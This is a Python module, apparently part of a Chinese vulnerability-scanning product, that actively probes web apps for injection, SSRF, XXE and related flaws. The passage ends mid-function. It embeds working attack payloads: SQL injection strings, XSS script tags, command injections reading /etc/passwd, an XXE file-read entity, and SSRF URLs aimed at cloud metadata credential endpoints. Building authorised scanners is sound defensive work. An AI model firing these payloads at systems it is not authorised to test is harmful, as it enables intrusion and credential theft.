# -*- coding: utf-8 -*-
"""AI漏洞扫描系统 - 主动 Web 应用漏洞扫描模块

移植自开源项目 deep-eye（https://github.com/zakirkun/deep-eye）中
自包含、零新依赖的主动 Web 漏洞检测能力，适配 AI-VULN 的架构约定：
- 结果字段对齐 web_scan_results 表（category/title/severity/detail/evidence/url）
- severity 统一为大写 CRITICAL/HIGH/MEDIUM/LOW/INFO
- 复用 requests，verify=False 与现有 web_scanner.py 一致（自签名/内部证书场景）

覆盖 ~29 类主动检测：
  经典注入（SQLi/XSS/命令注入/SSRF/XXE/路径遍历/LFI/RFI/SSTI/CRLF/LDAP/XML）
  配置与认证（CSRF/开放重定向/CORS/安全头/Host头/认证绕过/失效认证/反序列化）
  信息泄露（信息泄露/敏感数据/JWT）
  深检测（JWT alg=none·kid/CORS-CSP/SSRF云元数据绕过/SSTI多引擎/IDOR/NoSQL）
"""
import base64
import hashlib
import json
import logging
import re
import time
from enum import Enum
from typing import Dict, List, Optional, Tuple
from urllib.parse import parse_qs, urlencode, urljoin, urlparse, urlunparse

import requests

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# 抑制自签名证书告警（与 web_scanner.py 一致）
try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except Exception:
    pass

DEFAULT_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AI-Vuln-WebVuln/2.1'

_SEVERITY_MAP = {
    'critical': 'CRITICAL',
    'high': 'HIGH',
    'medium': 'MEDIUM',
    'low': 'LOW',
    'info': 'INFO',
    'informational': 'INFO',
}


class ScanStopped(Exception):
    """主动检测被协作式停止的信号（由 stop_event 触发）。"""


# ============================================================
# 1. 多注入面发现 + 注入派发（移植自 deep-eye core/injection_surfaces.py）
# ============================================================
class Surface(str, Enum):
    """注入面类型"""
    QUERY = "query"
    FORM_POST = "form_post"
    JSON_BODY = "json_body"
    COOKIE = "cookie"
    HEADER = "header"
    PATH_SEGMENT = "path_segment"


Param = Tuple[str, str]  # name, default value


def extract_surfaces(url: str, context: Optional[Dict] = None) -> Dict[Surface, List[Param]]:
    """从 URL 与上下文发现可注入参数（query/form/json/cookie/header/path）。"""
    context = context or {}
    out: Dict[Surface, List[Param]] = {s: [] for s in Surface}

    parsed = urlparse(url or "")
    qs = parse_qs(parsed.query, keep_blank_values=True)
    for k, vals in qs.items():
        out[Surface.QUERY].append((k, vals[0] if vals else ""))
    stub = context.get("openapi_query_stub") or ""
    if stub and isinstance(stub, str):
        for k, vals in parse_qs(stub, keep_blank_values=True).items():
            out[Surface.QUERY].append((k, vals[0] if vals else ""))
    for name in context.get("query_params") or []:
        out[Surface.QUERY].append((str(name), ""))

    for form in context.get("forms") or []:
        if not isinstance(form, dict):
            continue
        method = str(form.get("method") or "GET").upper()
        if method == "GET":
            for inp in form.get("inputs") or []:
                name = (inp or {}).get("name") or ""
                if name:
                    out[Surface.QUERY].append((name, str((inp or {}).get("value") or "")))
        else:
            for inp in form.get("inputs") or []:
                name = (inp or {}).get("name") or ""
                if name:
                    out[Surface.FORM_POST].append((name, str((inp or {}).get("value") or "")))

    for name in context.get("json_params") or []:
        out[Surface.JSON_BODY].append((str(name), ""))
    body = context.get("json_body")
    if isinstance(body, dict):
        for k, v in body.items():
            if isinstance(v, (str, int, float, bool)) or v is None:
                out[Surface.JSON_BODY].append((str(k), "" if v is None else str(v)))

    cookies = context.get("cookies") or {}
    if isinstance(cookies, dict):
        for k, v in cookies.items():
            out[Surface.COOKIE].append((str(k), str(v)))

    headers = context.get("injectable_headers") or [
        "X-Forwarded-For", "X-Original-URL", "X-Rewrite-URL", "Referer", "User-Agent",
    ]
    for h in headers:
        out[Surface.HEADER].append((str(h), ""))

    # 数字 / uuid-like 路径段
    for seg in (parsed.path or "").split("/"):
        if not seg:
            continue
        if re.fullmatch(r"\d{1,12}", seg) or re.fullmatch(r"[0-9a-fA-F-]{8,36}", seg):
            out[Surface.PATH_SEGMENT].append((seg, seg))

    # 逐面去重
    for s in list(out.keys()):
        seen = set()
        uniq = []
        for name, val in out[s]:
            key = (name, val)
            if key in seen:
                continue
            seen.add(key)
            uniq.append((name, val))
        out[s] = uniq
    return out


def inject(url: str, context: Optional[Dict], surface: Surface, param: str,
           value: str, http_client=None, method: str = "GET", allow_redirects: bool = False):
    """在指定注入面上构造并发送带 payload 的请求，返回 Response 或 None。"""
    context = context or {}
    if http_client is None:
        raise ValueError("http_client required")

    parsed = urlparse(url)

    if surface == Surface.QUERY:
        qs = parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [value]
        test_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
        return http_client.get(test_url, allow_redirects=allow_redirects)

    if surface == Surface.FORM_POST:
        data = {}
        for form in context.get("forms") or []:
            if str(form.get("method") or "").upper() in ("POST", "PUT", "PATCH"):
                for inp in form.get("inputs") or []:
                    n = (inp or {}).get("name")
                    if n:
                        data[n] = (inp or {}).get("value") or ""
        data[param] = value
        action = url
        for form in context.get("forms") or []:
            if form.get("action"):
                action = urljoin(url, form["action"])
                break
        # SSRF 防护：校验表单 action 不指向内网/受限地址（防止目标表单投递内网请求）
        try:
            from ssrf_guard import ssrf_guard
            ssrf_guard(action)
        except ValueError:
            logger.debug(f"表单 action 触发 SSRF 防护，跳过: {action}")
            return None
        except ImportError:
            # fail-closed：防护模块缺失时阻断表单提交，而非静默放行
            logger.error('ssrf_guard 模块缺失，阻断表单提交')
            return None
        return http_client.post(action, data=data)

    if surface == Surface.JSON_BODY:
        body = dict(context.get("json_body") or {})
        body[param] = value
        return http_client.post(url, json=body, headers={"Content-Type": "application/json"})

    if surface == Surface.COOKIE:
        return http_client.get(url, headers={"Cookie": f"{param}={value}"})

    if surface == Surface.HEADER:
        return http_client.get(url, headers={param: value})

    if surface == Surface.PATH_SEGMENT:
        parts = (parsed.path or "/").split("/")
        for i, seg in enumerate(parts):
            if seg == param:
                parts[i] = value
                break
        else:
            parts.append(value)
        new_path = "/".join(parts)
        if not new_path.startswith("/"):
            new_path = "/" + new_path
        test_url = urlunparse(parsed._replace(path=new_path))
        return http_client.get(test_url)

    return None


# ============================================================
# 2. HTTP 客户端适配器（对齐 deep-eye 模块对 http_client 的调用面）
# ============================================================
class SafeHTTPClient:
    """薄 HTTP 适配器：requests.Session + 统一 UA/timeout + 按目标自动校验证书。"""

    def __init__(self, timeout: int = 10, user_agent: str = DEFAULT_UA,
                 verify: Optional[bool] = None):
        self.timeout = timeout
        # verify=None 表示"自动"：公网目标强制校验证书，内网目标关闭校验
        # （内网自签名/内部 CA 校验会误报大量证书错误）。显式 True/False 则覆盖。
        self.verify = verify
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': user_agent, 'Accept': '*/*'})

    def _verify_for(self, url: str) -> bool:
        if self.verify is not None:
            return self.verify
        from ssrf_guard import tls_verify
        return tls_verify(url)

    def get(self, url: str, params: Optional[Dict] = None, headers: Optional[Dict] = None,
            allow_redirects: bool = False, timeout: Optional[int] = None, **kwargs) -> Optional[requests.Response]:
        # 默认不跟随重定向：扫描器对重定向应"报告而非跟随"，否则公网目标
        # 一个 302 跳回内网/云元数据即可绕过 SSRF 校验（见 ssrf_guard 重定向链分析）
        try:
            return self.session.get(url, params=params, headers=headers,
                                    timeout=timeout or self.timeout,
                                    verify=self._verify_for(url),
                                    allow_redirects=allow_redirects, **kwargs)
        except requests.RequestException as e:
            logger.debug(f"GET 请求失败 {url}: {e}")
            return None

    def post(self, url: str, data: Optional[Dict] = None, json: Optional[Dict] = None,
             headers: Optional[Dict] = None, timeout: Optional[int] = None, **kwargs) -> Optional[requests.Response]:
        try:
            return self.session.post(url, data=data, json=json, headers=headers,
                                     timeout=timeout or self.timeout,
                                     verify=self._verify_for(url),
                                     allow_redirects=False, **kwargs)
        except requests.RequestException as e:
            logger.debug(f"POST 请求失败 {url}: {e}")
            return None

    def head(self, url: str, **kwargs) -> Optional[requests.Response]:
        try:
            return self.session.head(url, timeout=self.timeout,
                                     verify=self._verify_for(url),
                                     allow_redirects=False, **kwargs)
        except requests.RequestException:
            return None

    def options(self, url: str, **kwargs) -> Optional[requests.Response]:
        try:
            return self.session.options(url, timeout=self.timeout,
                                        verify=self._verify_for(url),
                                        allow_redirects=False, **kwargs)
        except requests.RequestException:
            return None

    def delete(self, url: str, headers: Optional[Dict] = None, timeout: Optional[int] = None,
               **kwargs) -> Optional[requests.Response]:
        try:
            return self.session.delete(url, headers=headers, timeout=timeout or self.timeout,
                                       verify=self._verify_for(url),
                                       allow_redirects=False, **kwargs)
        except requests.RequestException:
            return None

    def put(self, url: str, data=None, json=None, headers: Optional[Dict] = None,
            timeout: Optional[int] = None, **kwargs) -> Optional[requests.Response]:
        try:
            return self.session.put(url, data=data, json=json, headers=headers,
                                    timeout=timeout or self.timeout,
                                    verify=self._verify_for(url),
                                    allow_redirects=False, **kwargs)
        except requests.RequestException:
            return None

    def patch(self, url: str, data=None, json=None, headers: Optional[Dict] = None,
              timeout: Optional[int] = None, **kwargs) -> Optional[requests.Response]:
        try:
            return self.session.patch(url, data=data, json=json, headers=headers,
                                      timeout=timeout or self.timeout,
                                      verify=self._verify_for(url),
                                      allow_redirects=False, **kwargs)
        except requests.RequestException:
            return None

    def request(self, method: str, url: str, **kwargs) -> Optional[requests.Response]:
        try:
            return self.session.request(method, url, timeout=kwargs.pop('timeout', self.timeout),
                                        verify=self._verify_for(url),
                                        allow_redirects=False, **kwargs)
        except requests.RequestException as e:
            logger.debug(f"{method} 请求失败 {url}: {e}")
            return None


# ============================================================
# 3. 主动 Web 漏洞扫描引擎
# ============================================================
class WebVulnScanner:
    """主动 Web 应用漏洞扫描器 — 移植 deep-eye 的自包含检测能力。

    默认 29 类检测（均为非破坏性反射/配置探测，读安全），可通过
    `enabled_checks` 白名单裁剪。输出为 AI-VULN 统一 finding 结构。
    """

    # 默认 payload 语料（deep-eye 由 AI payload 生成器提供，此处内置保守默认值）
    DEFAULT_PAYLOADS = {
        'sql_injection': [
            "' OR '1'='1", "' OR 1=1--", '" OR "1"="1', "' AND SLEEP(5)--",
            "1' AND SLEEP(5)--", "' OR SLEEP(5)#",
        ],
        'xss': [
            '<script>alert(1)</script>', '"><script>alert(1)</script>',
            '<img src=x onerror=alert(1)>', "'><script>alert(1)</script>",
            '"><svg/onload=alert(1)>',
        ],
        'command_injection': [
            '; cat /etc/passwd', '| cat /etc/passwd', '`cat /etc/passwd`',
            '; sleep 5', '| sleep 5', '$(sleep 5)',
        ],
        'ssrf': [],
        'xxe': [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        ],
        'path_traversal': [],
        'lfi': [],
        'rfi': [],
        'ssti': [],
        'crlf_injection': [],
        'ldap_injection': [],
        'xml_injection': [],
        'open_redirect': [],
    }

    def __init__(self, timeout: int = 10, enabled_checks: Optional[List[str]] = None,
                 verify: Optional[bool] = None):
        self.http_client = SafeHTTPClient(timeout=timeout, verify=verify)
        self.timeout = timeout
        self.verify = verify
        # 默认启用的 29 类检测（名称与 deep-eye 保持一致）
        self.enabled_checks = enabled_checks or [
            'sql_injection', 'xss', 'command_injection', 'ssrf', 'xxe',
            'path_traversal', 'csrf', 'open_redirect', 'cors_misconfiguration',
            'security_misconfiguration', 'lfi', 'rfi', 'ssti', 'crlf_injection',
            'host_header_injection', 'ldap_injection', 'xml_injection',
            'insecure_deserialization', 'authentication_bypass',
            'information_disclosure', 'sensitive_data_exposure',
            'jwt_vulnerabilities', 'broken_authentication',
            'jwt_deep', 'cors_csp', 'ssrf_cloud', 'ssti_engines', 'idor',
            'nosql_injection',
            'stored_xss', 'hpp_pollution', 'http_method_override',
            'mass_assignment', 'prototype_pollution', 'host_header_deep',
            'crlf_header_inject_deep', 'open_redirect_deep', 'api_bola_deep',
            'email_injection', 'graphql_deep', 'cache_poisoning',
            'cache_deception', 'php_webshell', 'sse_injection', 'race_condition',
        ]
        logger.info(f"Web主动漏洞扫描器初始化完成（{len(self.enabled_checks)} 类检测）")

    # ---------- 主入口 ----------
    def scan(self, url: str, context: Optional[Dict] = None,
             progress_callback=None, stop_event=None) -> List[Dict]:
        """对目标 URL 执行主动漏洞检测，返回 AI-VULN 统一 finding 列表。

        stop_event: 可选 threading.Event，置位后在各检测项之间抛出 ScanStopped，
        供上层协作式停止（不再等待整轮 45 项检测完成）。
        """
        context = context or {}
        # 抓取基线响应，供 JWT/CORS/IDOR 等深检测复用
        if context.get('response') is None:
            try:
                context['response'] = self.http_client.get(url)
            except Exception:
                pass
        if context.get('html_content') is None and context.get('response') is not None:
            context['html_content'] = getattr(context['response'], 'text', '') or ''
        # 从基线 HTML 提取表单，使 POST/GET 表单注入面可被发现（多注入面）
        if not context.get('forms'):
            context['forms'] = self._extract_forms(context.get('html_content', ''), url)

        payloads = dict(self.DEFAULT_PAYLOADS)
        findings: List[Dict] = []

        def _emit(name, raw):
            if stop_event is not None and stop_event.is_set():
                raise ScanStopped()
            if raw:
                findings.extend(raw)
            if progress_callback:
                progress_callback(f'主动检测 {name}: 命中 {len(raw or [])} 项')

        # ---- 经典注入 ----
        if 'sql_injection' in self.enabled_checks:
            _emit('sql_injection', self._check_sql_injection(url, payloads['sql_injection'], context))
        if 'xss' in self.enabled_checks:
            _emit('xss', self._check_xss(url, payloads['xss'], context))
        if 'command_injection' in self.enabled_checks:
            _emit('command_injection', self._check_command_injection(url, payloads['command_injection'], context))
        if 'ssrf' in self.enabled_checks:
            _emit('ssrf', self._check_ssrf(url, payloads['ssrf'], context))
        if 'xxe' in self.enabled_checks:
            _emit('xxe', self._check_xxe(url, payloads['xxe']))
        if 'path_traversal' in self.enabled_checks:
            _emit('path_traversal', self._check_path_traversal(url, payloads['path_traversal'], context))
        if 'lfi' in self.enabled_checks:
            _emit('lfi', self._check_lfi(url, payloads['lfi'], context))
        if 'rfi' in self.enabled_checks:
            _emit('rfi', self._check_rfi(url, payloads['rfi'], context))
        if 'ssti' in self.enabled_checks:
            _emit('ssti', self._check_ssti(url, payloads['ssti'], context))
        if 'crlf_injection' in self.enabled_checks:
            _emit('crlf_injection', self._check_crlf_injection(url, payloads['crlf_injection'], context))
        if 'ldap_injection' in self.enabled_checks:
            _emit('ldap_injection', self._check_ldap_injection(url, payloads['ldap_injection'], context))
        if 'xml_injection' in self.enabled_checks:
            _emit('xml_injection', self._check_xml_injection(url, payloads['xml_injection']))

        # ---- 配置与认证 ----
        if 'csrf' in self.enabled_checks:
            _emit('csrf', self._check_csrf(url, context))
        if 'open_redirect' in self.enabled_checks:
            _emit('open_redirect', self._check_open_redirect(url, payloads['open_redirect'], context))
        if 'cors_misconfiguration' in self.enabled_checks:
            _emit('cors_misconfiguration', self._check_cors(url))
        if 'security_misconfiguration' in self.enabled_checks:
            _emit('security_misconfiguration', self._check_security_headers(url, context))
        if 'host_header_injection' in self.enabled_checks:
            _emit('host_header_injection', self._check_host_header_injection(url))
        if 'insecure_deserialization' in self.enabled_checks:
            _emit('insecure_deserialization', self._check_insecure_deserialization(url, context))
        if 'authentication_bypass' in self.enabled_checks:
            _emit('authentication_bypass', self._check_authentication_bypass(url, context))
        if 'broken_authentication' in self.enabled_checks:
            _emit('broken_authentication', self._check_broken_authentication(url, context))

        # ---- 信息泄露 ----
        if 'information_disclosure' in self.enabled_checks:
            _emit('information_disclosure', self._check_information_disclosure(url, context))
        if 'sensitive_data_exposure' in self.enabled_checks:
            _emit('sensitive_data_exposure', self._check_sensitive_data_exposure(url, context))
        if 'jwt_vulnerabilities' in self.enabled_checks:
            _emit('jwt_vulnerabilities', self._check_jwt_vulnerabilities(url, context))

        # ---- 深检测（feature testers） ----
        if 'jwt_deep' in self.enabled_checks:
            _emit('jwt_deep', self._check_jwt_deep(url, context))
        if 'cors_csp' in self.enabled_checks:
            _emit('cors_csp', self._check_cors_csp(url, context))
        if 'ssrf_cloud' in self.enabled_checks:
            _emit('ssrf_cloud', self._check_ssrf_cloud(url, context))
        if 'ssti_engines' in self.enabled_checks:
            _emit('ssti_engines', self._check_ssti_engines(url, context))
        if 'idor' in self.enabled_checks:
            _emit('idor', self._check_idor(url, context))
        if 'nosql_injection' in self.enabled_checks:
            _emit('nosql_injection', self._check_nosql(url, context))

        # ---- 二次注入 / 参数解析 / 方法覆盖 / 业务逻辑深检测 ----
        if 'stored_xss' in self.enabled_checks:
            _emit('stored_xss', self._check_stored_xss(url, context))
        if 'hpp_pollution' in self.enabled_checks:
            _emit('hpp_pollution', self._check_hpp_pollution(url, context))
        if 'http_method_override' in self.enabled_checks:
            _emit('http_method_override', self._check_http_method_override(url, context))
        if 'mass_assignment' in self.enabled_checks:
            _emit('mass_assignment', self._check_mass_assignment(url, context))
        if 'prototype_pollution' in self.enabled_checks:
            _emit('prototype_pollution', self._check_prototype_pollution(url, context))
        if 'host_header_deep' in self.enabled_checks:
            _emit('host_header_deep', self._check_host_header_deep(url, context))
        if 'crlf_header_inject_deep' in self.enabled_checks:
            _emit('crlf_header_inject_deep', self._check_crlf_header_inject_deep(url, context))
        if 'open_redirect_deep' in self.enabled_checks:
            _emit('open_redirect_deep', self._check_open_redirect_deep(url, context))
        if 'api_bola_deep' in self.enabled_checks:
            _emit('api_bola_deep', self._check_api_bola_deep(url, context))
        if 'email_injection' in self.enabled_checks:
            _emit('email_injection', self._check_email_injection(url, context))
        if 'graphql_deep' in self.enabled_checks:
            _emit('graphql_deep', self._check_graphql_deep(url, context))
        if 'cache_poisoning' in self.enabled_checks:
            _emit('cache_poisoning', self._check_cache_poisoning(url, context))
        if 'cache_deception' in self.enabled_checks:
            _emit('cache_deception', self._check_cache_deception(url, context))
        if 'php_webshell' in self.enabled_checks:
            _emit('php_webshell', self._check_php_webshell(url, context))
        if 'sse_injection' in self.enabled_checks:
            _emit('sse_injection', self._check_sse_injection(url, context))
        if 'race_condition' in self.enabled_checks:
            _emit('race_condition', self._check_race_condition(url, context))

        return self._normalize(findings)

    # ---------- 结果归一化 ----------
    @staticmethod
    def _normalize(findings: List[Dict]) -> List[Dict]:
        """deep-eye 结果字段 → AI-VULN 统一 finding 结构。"""
        out = []
        for f in findings:
            sev = str(f.get('severity', 'medium')).lower()
            out.append({
                'scan_type': 'web_vuln',
                'category': 'web_vuln',
                'title': f.get('type', 'Web Vulnerability'),
                'severity': _SEVERITY_MAP.get(sev, 'MEDIUM'),
                'detail': f.get('description', ''),
                'evidence': f.get('evidence', ''),
                'url': f.get('url', ''),
                'parameter': f.get('parameter', ''),
                'payload': f.get('payload', ''),
                'remediation': f.get('remediation', ''),
            })
        return out

    # ---------- 注入辅助 ----------
    def _inject_and_get(self, url, context, surface, param, payload, allow_redirects: bool = False):
        try:
            return inject(url, context or {}, surface, param, payload,
                          http_client=self.http_client, allow_redirects=allow_redirects)
        except Exception as e:
            logger.debug(f"注入失败 {surface}/{param}: {e}")
            return None

    def _injection_targets(self, url: str, context: Dict = None):
        surfaces = extract_surfaces(url, context or {})
        order = [Surface.QUERY, Surface.FORM_POST, Surface.JSON_BODY, Surface.PATH_SEGMENT, Surface.COOKIE]
        if (context or {}).get("probe_headers"):
            order.append(Surface.HEADER)
        seen = set()
        for surf in order:
            for name, _default in surfaces.get(surf) or []:
                key = (surf, name)
                if key in seen:
                    continue
                seen.add(key)
                yield surf, name

    @staticmethod
    def _fallback_targets(url: str, context: Dict = None):
        """无注入面时的兜底：取 URL 查询参数名。"""
        params = parse_qs(urlparse(url).query)
        if params:
            return [(None, p) for p in params.keys()]
        return []

    def _baseline(self, url: str, context: Dict = None):
        """复用 scan() 已抓取的基线响应，避免被动检测重复 GET 首页。"""
        resp = (context or {}).get('response')
        if resp is None:
            resp = self.http_client.get(url)
        return resp

    @staticmethod
    def _extract_forms(html: str, base_url: str) -> List[Dict]:
        """从 HTML 轻量提取 <form> 结构（method/action/inputs），供注入面发现。"""
        forms = []
        if not html:
            return forms
        for fm in re.finditer(r'<form\b[^>]*>(.*?)</form>', html, re.IGNORECASE | re.DOTALL):
            form_tag = fm.group(0)
            body = fm.group(1)
            method_m = re.search(r'\bmethod\s*=\s*["\']?(\w+)', form_tag, re.IGNORECASE)
            method = (method_m.group(1) if method_m else 'GET').upper()
            action_m = re.search(r'\baction\s*=\s*["\']([^"\']+)', form_tag, re.IGNORECASE)
            action = action_m.group(1) if action_m else ''
            inputs = []
            for im in re.finditer(r'<(input|textarea|select)\b[^>]*>', body, re.IGNORECASE):
                tag = im.group(0)
                name_m = re.search(r'\bname\s*=\s*["\']([^"\']+)', tag, re.IGNORECASE)
                if not name_m:
                    continue
                val_m = re.search(r'\bvalue\s*=\s*["\']([^"\']*)', tag, re.IGNORECASE)
                inputs.append({'name': name_m.group(1), 'value': val_m.group(1) if val_m else ''})
            if inputs:
                forms.append({'method': method, 'action': action, 'inputs': inputs})
        return forms

    # ============================================================
    # 经典注入检测（移植自 deep-eye core/vulnerability_scanner.py）
    # ============================================================
    def _check_sql_injection(self, url, payloads, context=None):
        vulnerabilities = []
        context = context or {}
        targets = list(self._injection_targets(url, context)) or self._fallback_targets(url, context)

        sql_errors = [
            r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"MySQLSyntaxErrorException",
            r"valid MySQL result", r"ODBC SQL Server Driver", r"SQLServer JDBC Driver",
            r"Oracle error", r"PostgreSQL.*ERROR", r"Warning.*pg_.*",
            r"valid PostgreSQL result", r"Npgsql\.", r"PG::SyntaxError:",
            r"SQLite/JDBCDriver", r"SQLite.Exception", r"System.Data.SQLite.SQLiteException",
        ]

        for surface, param_name in targets:
            for payload in payloads[:5]:
                try:
                    if surface is None:
                        parsed = urlparse(url)
                        params = parse_qs(parsed.query)
                        test_params = params.copy()
                        test_params[param_name] = [payload]
                        test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                               parsed.params, urlencode(test_params, doseq=True), parsed.fragment))
                        response = self.http_client.get(test_url)
                    else:
                        response = self._inject_and_get(url, context, surface, param_name, payload)
                    if not response:
                        continue
                    body = getattr(response, "text", "") or ""
                    for error_pattern in sql_errors:
                        if re.search(error_pattern, body, re.IGNORECASE):
                            vulnerabilities.append({
                                'type': 'SQL Injection', 'severity': 'critical', 'url': url,
                                'parameter': param_name, 'payload': payload,
                                'evidence': f"SQL 错误模式命中: {error_pattern}",
                                'description': 'SQL 注入允许攻击者操纵数据库查询',
                                'remediation': '使用参数化查询或预编译语句',
                                'surface': getattr(surface, 'value', 'query'),
                            })
                            # proof-based：布尔盲注差分确认（安全、可逆）
                            try:
                                from proof_verifier import build_boolean_sqli_pair, is_boolean_differential
                                _tp, _fp = build_boolean_sqli_pair()
                                _r_t = self._inject_and_get(url, context, surface, param_name, _tp)
                                _r_f = self._inject_and_get(url, context, surface, param_name, _fp)
                                if _r_t is not None and _r_f is not None:
                                    _t_txt = getattr(_r_t, 'text', '') or ''
                                    _f_txt = getattr(_r_f, 'text', '') or ''
                                    if is_boolean_differential(_t_txt, _f_txt):
                                        vulnerabilities[-1]['proof_verified'] = True
                                        vulnerabilities[-1]['evidence'] += '；[proof] 布尔盲注差分确认'
                            except Exception:
                                pass
                            break
                    if any(k in payload for k in ('SLEEP', 'BENCHMARK', 'pg_sleep', 'WAITFOR')):
                        start_time = time.time()
                        if surface is None:
                            response = self.http_client.get(test_url)
                        else:
                            response = self._inject_and_get(url, context, surface, param_name, payload)
                        elapsed = time.time() - start_time
                        if elapsed > 4.5:
                            vulnerabilities.append({
                                'type': 'Time-Based Blind SQL Injection', 'severity': 'high',
                                'url': url, 'parameter': param_name, 'payload': payload,
                                'evidence': f'响应延迟 {elapsed:.2f} 秒',
                                'description': '检测到时间盲注 SQL 注入',
                                'remediation': '使用参数化查询或预编译语句',
                                'surface': getattr(surface, 'value', 'query'),
                            })
                except Exception as e:
                    logger.debug(f"SQL 注入测试失败 {url}: {e}")
        return vulnerabilities

    def _check_xss(self, url, payloads, context=None):
        vulnerabilities = []
        context = context or {}
        targets = list(self._injection_targets(url, context)) or self._fallback_targets(url, context)

        for surface, param_name in targets:
            for payload in payloads[:5]:
                try:
                    if surface is None:
                        parsed = urlparse(url)
                        params = parse_qs(parsed.query)
                        test_params = params.copy()
                        test_params[param_name] = [payload]
                        test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                               parsed.params, urlencode(test_params, doseq=True), parsed.fragment))
                        response = self.http_client.get(test_url)
                    else:
                        response = self._inject_and_get(url, context, surface, param_name, payload)
                    if not response:
                        continue
                    body = getattr(response, "text", "") or ""
                    marker = payload[:40] if len(payload) > 10 else payload
                    if marker and marker in body:
                        vulnerabilities.append({
                            'type': 'Cross-Site Scripting (XSS)', 'severity': 'high', 'url': url,
                            'parameter': param_name, 'payload': payload,
                            'evidence': f'payload 反射回响应（{getattr(surface, "value", "query")}）',
                            'description': '反射型 XSS 允许向响应注入脚本',
                            'remediation': '对输出做上下文编码；启用 CSP',
                            'surface': getattr(surface, 'value', 'query'),
                        })
                        # proof-based：唯一 token 未编码回显确认（区分已转义输出）
                        try:
                            from proof_verifier import build_xss_proof_token, is_token_reflected_unencoded
                            _tok, _pp = build_xss_proof_token()
                            _r = self._inject_and_get(url, context, surface, param_name, _pp)
                            if _r is not None:
                                _txt = getattr(_r, 'text', '') or ''
                                if is_token_reflected_unencoded(_txt, _tok):
                                    vulnerabilities[-1]['proof_verified'] = True
                                    vulnerabilities[-1]['evidence'] += f'；[proof] 唯一 token 未编码回显'
                        except Exception:
                            pass
                        break
                except Exception as e:
                    logger.debug(f"XSS 测试失败 {url}: {e}")
        return vulnerabilities

    def _check_command_injection(self, url, payloads, context=None):
        vulnerabilities = []
        context = context or {}
        targets = list(self._injection_targets(url, context)) or self._fallback_targets(url, context)

        indicators = ['root:x:0:0', 'nobody:x:65534', '[boot loader]', 'www-data', 'uid=', 'gid=']

        for surface, param_name in targets:
            for payload in payloads:
                try:
                    if surface is None:
                        parsed = urlparse(url)
                        params = parse_qs(parsed.query)
                        test_params = params.copy()
                        test_params[param_name] = [payload]
                        test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                               parsed.params, urlencode(test_params, doseq=True), parsed.fragment))
                        if 'sleep' in payload.lower():
                            start_time = time.time()
                            response = self.http_client.get(test_url)
                            elapsed = time.time() - start_time
                            if elapsed > 4.5:
                                vulnerabilities.append({
                                    'type': 'Command Injection', 'severity': 'critical', 'url': url,
                                    'parameter': param_name, 'payload': payload,
                                    'evidence': f'响应延迟 {elapsed:.2f} 秒',
                                    'description': '命令注入允许任意命令执行',
                                    'remediation': '避免用系统命令处理用户输入，使用参数数组',
                                    'surface': 'query',
                                })
                            continue
                        response = self.http_client.get(test_url)
                    else:
                        if 'sleep' in payload.lower():
                            start_time = time.time()
                            response = self._inject_and_get(url, context, surface, param_name, payload)
                            elapsed = time.time() - start_time
                            if elapsed > 4.5:
                                vulnerabilities.append({
                                    'type': 'Command Injection', 'severity': 'critical', 'url': url,
                                    'parameter': param_name, 'payload': payload,
                                    'evidence': f'响应延迟 {elapsed:.2f} 秒',
                                    'description': '命令注入允许任意命令执行',
                                    'remediation': '避免用系统命令处理用户输入，使用参数数组',
                                    'surface': getattr(surface, 'value', 'query'),
                                })
                            continue
                        response = self._inject_and_get(url, context, surface, param_name, payload)
                    if not response:
                        continue
                    body = getattr(response, 'text', '') or ''
                    for indicator in indicators:
                        if indicator in body:
                            vulnerabilities.append({
                                'type': 'Command Injection', 'severity': 'critical', 'url': url,
                                'parameter': param_name, 'payload': payload,
                                'evidence': f'命令输出指示符命中: {indicator}',
                                'description': '命令注入允许任意命令执行',
                                'remediation': '避免用系统命令处理用户输入，使用参数数组',
                                'surface': getattr(surface, 'value', 'query'),
                            })
                            break
                except Exception as e:
                    logger.debug(f"命令注入测试失败 {url}: {e}")
        return vulnerabilities

    def _check_ssrf(self, url, payloads, context=None):
        vulnerabilities = []
        context = context or {}
        targets = list(self._injection_targets(url, context)) or self._fallback_targets(url, context)

        ssrf_payloads = list(payloads[:8]) if payloads else []
        ssrf_payloads.extend([
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
            'http://127.0.0.1/', 'http://localhost/', 'http://[::1]/', 'file:///etc/passwd',
        ])
        ssrf_payloads = list(dict.fromkeys(ssrf_payloads))[:12]

        ssrf_indicators = [
            'ami-id', 'instance-id', 'local-hostname', 'public-hostname',
            'computeMetadata', 'project/project-id', 'vmId', 'subscriptionId',
            'droplet_id', 'zone-id', 'region-id', 'OpenSSH', 'SSH-2.0',
            'mysql_native_password', 'MariaDB', 'root:x:0:0',
        ]

        for surface, param_name in targets:
            for payload in ssrf_payloads:
                try:
                    if surface is None:
                        parsed = urlparse(url)
                        params = parse_qs(parsed.query)
                        test_params = params.copy()
                        test_params[param_name] = [payload]
                        test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                               parsed.params, urlencode(test_params, doseq=True), parsed.fragment))
                        response = self.http_client.get(test_url)
                    else:
                        response = self._inject_and_get(url, context, surface, param_name, payload)
                    if not response:
                        continue
                    body = getattr(response, 'text', '') or ''
                    for indicator in ssrf_indicators:
                        if indicator in body:
                            vulnerabilities.append({
                                'type': 'Server-Side Request Forgery (SSRF)', 'severity': 'critical',
                                'url': url, 'parameter': param_name, 'payload': payload,
                                'evidence': f'SSRF 指示符 "{indicator}" 命中响应',
                                'description': 'SSRF 允许访问内部资源与云元数据',
                                'remediation': '校验并白名单化 URL/域名，阻止访问内网与云元数据端点',
                                'surface': getattr(surface, 'value', 'query'),
                            })
                            break
                except Exception as e:
